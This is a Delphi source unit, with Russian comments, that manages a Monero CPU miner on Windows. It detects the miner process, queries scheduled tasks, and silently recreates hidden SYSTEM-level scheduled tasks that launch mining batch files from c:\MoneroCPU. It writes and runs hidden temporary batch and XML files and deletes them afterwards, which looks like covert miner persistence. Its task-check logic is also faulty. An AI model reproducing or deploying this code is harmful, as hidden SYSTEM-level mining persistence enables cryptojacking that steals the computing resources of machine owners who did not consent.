unit gvar;
interface
uses Winapi.Windows, Winapi.Messages, System.SysUtils, System.Classes,TLHELP32;

function ProverkaRegZadaniy():Boolean;
function FindCPUMiner():boolean;
function GetProcess: TStringList;

var StopSignal:boolean;
  EXEPath:string;

implementation

function FindCPUMiner():boolean;
var process:TStringList;
pcount,i:Integer;
begin
  process := TStringList.Create;
  process.Clear;
  process := GetProcess;
  pcount := 0;
  for i := 0 to process.Count - 1 do
    if process[i] = 'NsCpuCNMiner64.exe' then
      pcount := pcount + 1;
  if pcount > 1 then
    result := True
   else result := False;
end;

function GetProcess: TStringList;
const
  PROCESS_TERMINATE = $0001;
var
  Co: BOOL;
  FS: THandle;
  FP: TProcessEntry32;
begin
  Result := TStringList.Create;
  FS := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FP.dwSize := Sizeof(FP);
  Co := Process32First(FS, FP);
  while Integer(Co) <> 0 do
  begin
    Result.Add(FP.szExeFile);
    Co := Process32Next(FS, FP);
  end;
  CloseHandle(FS);
end;

function ProverkaRegZadaniy():Boolean;
var f:TextFile;
s:string;
recreate:Boolean;
begin
  result:=True;
  recreate:=False;
  AssignFile(f,EXEPath+'read_zad.bat');
  Rewrite(f);
  Writeln(f,'schtasks /query  >> '+EXEPath+'p0102.csv');
  CloseFile(f);

  WinExec(PAnsiChar(EXEPath+'read_zad.bat'),SW_HIDE);
  Sleep(500);
  AssignFile(f,EXEPath+'p0102.csv');
  Reset(f);
  while not Eof(f) do
  begin
   Readln(f,s);
   if (AnsiPos('run_mine2',s)=0) or (AnsiPos('run_mine2',s)=0) or (AnsiPos('kill_mine2',s)=0)
      or (AnsiPos('kill_mine',s)=0) then recreate:=True
  end;
  CloseFile(f);
  DeleteFile(EXEPath+'p0102.csv');
  // Если False - удаляем службы и пересоздаем заново
  if recreate then
  begin
   AssignFile(f,EXEPath+'delete_srv.bat');
   Rewrite(f);
   Writeln(f,'schtasks /delete /tn run_mine');
   Writeln(f,'schtasks /delete /tn run_mine2');
   Writeln(f,'schtasks /delete /tn kill_mine');
   Writeln(f,'schtasks /delete /tn kill_mine2');
   CloseFile(f);
   WinExec(PAnsiChar(EXEPath+'delete_srv.bat'),SW_HIDE);
   Sleep(100);
   DeleteFile(EXEPath+'delete_srv.bat');
   //************************* Создаем задания ****************************************
   //      *************** Файл первого задания ***************
   AssignFile(f,EXEPath+'run_mine.xml');
   Rewrite(f);
   Writeln(f,'<?xml version="1.0" encoding="UTF-16"?>');
   Writeln(f,'<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">');
   Writeln(f,'  <Triggers>');
   Writeln(f,'    <CalendarTrigger>');
   Writeln(f,'      <StartBoundary>2015-06-22T18:00:00</StartBoundary>');
   Writeln(f,'      <Enabled>true</Enabled>');
   Writeln(f,'      <ScheduleByDay>');
   Writeln(f,'        <DaysInterval>1</DaysInterval>');
   Writeln(f,'      </ScheduleByDay>');
   Writeln(f,'    </CalendarTrigger>');
   Writeln(f,'  </Triggers>');
   Writeln(f,'   <Settings>');
   Writeln(f,'    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>');
   Writeln(f,'    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>');
   Writeln(f,'    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>');
   Writeln(f,'    <AllowHardTerminate>true</AllowHardTerminate>');
   Writeln(f,'    <StartWhenAvailable>false</StartWhenAvailable>');
   Writeln(f,'    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>');
   Writeln(f,'    <IdleSettings>');
   Writeln(f,'      <StopOnIdleEnd>true</StopOnIdleEnd>');
   Writeln(f,'      <RestartOnIdle>false</RestartOnIdle>');
   Writeln(f,'    </IdleSettings>');
   Writeln(f,'    <AllowStartOnDemand>true</AllowStartOnDemand>');
   Writeln(f,'    <Enabled>true</Enabled>');
   Writeln(f,'    <Hidden>true</Hidden>');
   Writeln(f,'    <RunOnlyIfIdle>false</RunOnlyIfIdle>');
   Writeln(f,'    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>');
   Writeln(f,'    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>');
   Writeln(f,'    <WakeToRun>false</WakeToRun>');
   Writeln(f,'    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>');
   Writeln(f,'    <Priority>7</Priority>');
   Writeln(f,'  </Settings>');
   Writeln(f,'  <Actions Context="Author">');
   Writeln(f,'    <Exec>');
   Writeln(f,'      <Command>"c:\MoneroCPU\runmine.bat"</Command>');
   Writeln(f,'      <WorkingDirectory>c:\MoneroCPU\</WorkingDirectory>');
   Writeln(f,'    </Exec>');
   Writeln(f,'  </Actions>');
   Writeln(f,'</Task>');
   CloseFile(f);
   //      *************** Файл второго задания ***************
   AssignFile(f,EXEPath+'run_mine2.xml');
   Rewrite(f);
   Writeln(f,'<?xml version="1.0" encoding="UTF-16"?>');
   Writeln(f,'<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">');
   Writeln(f,'  <Triggers>');
   Writeln(f,'    <CalendarTrigger>');
   Writeln(f,'      <StartBoundary>2015-06-22T08:00:00</StartBoundary>');
   Writeln(f,'      <Enabled>true</Enabled>');
   Writeln(f,'      <ScheduleByDay>');
   Writeln(f,'        <DaysInterval>1</DaysInterval>');
   Writeln(f,'      </ScheduleByDay>');
   Writeln(f,'    </CalendarTrigger>');
   Writeln(f,'  </Triggers>');
   Writeln(f,'   <Settings>');
   Writeln(f,'    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>');
   Writeln(f,'    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>');
   Writeln(f,'    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>');
   Writeln(f,'    <AllowHardTerminate>true</AllowHardTerminate>');
   Writeln(f,'    <StartWhenAvailable>false</StartWhenAvailable>');
   Writeln(f,'    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>');
   Writeln(f,'    <IdleSettings>');
   Writeln(f,'      <StopOnIdleEnd>true</StopOnIdleEnd>');
   Writeln(f,'      <RestartOnIdle>false</RestartOnIdle>');
   Writeln(f,'    </IdleSettings>');
   Writeln(f,'    <AllowStartOnDemand>true</AllowStartOnDemand>');
   Writeln(f,'    <Enabled>true</Enabled>');
   Writeln(f,'    <Hidden>true</Hidden>');
   Writeln(f,'    <RunOnlyIfIdle>false</RunOnlyIfIdle>');
   Writeln(f,'    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>');
   Writeln(f,'    <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>');
   Writeln(f,'    <WakeToRun>false</WakeToRun>');
   Writeln(f,'    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>');
   Writeln(f,'    <Priority>7</Priority>');
   Writeln(f,'  </Settings>');
   Writeln(f,'  <Actions Context="Author">');
   Writeln(f,'    <Exec>');
   Writeln(f,'      <Command>"c:\MoneroCPU\runmine2.bat"</Command>');
   Writeln(f,'      <WorkingDirectory>c:\MoneroCPU\</WorkingDirectory>');
   Writeln(f,'    </Exec>');
   Writeln(f,'  </Actions>');
   Writeln(f,'</Task>');
   CloseFile(f);

   AssignFile(f,EXEPath+'create_srv.bat');
   Rewrite(f);
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /TN run_mine /XML c:\MoneroCPU\run_mine.xml');
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /TN run_mine2 /XML c:\MoneroCPU\run_mine2.xml');
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /SC DAILY /TN Kill_mine /TR c:\MoneroCPU\kill.bat /ST 17:59');
   Writeln(f,'SCHTASKS /Create /RU SYSTEM /RP /SC DAILY /TN Kill_mine2 /TR c:\MoneroCPU\kill.bat /ST 07:59');
   CloseFile(f);
   WinExec(PAnsiChar(EXEPath+'create_srv.bat'),SW_HIDE);
   Sleep(300);
   DeleteFile(EXEPath+'create_srv.bat');
   DeleteFile(EXEPath+'run_mine.xml');
   DeleteFile(EXEPath+'run_mine2.xml');
   result := false;
  end;
end;

end.
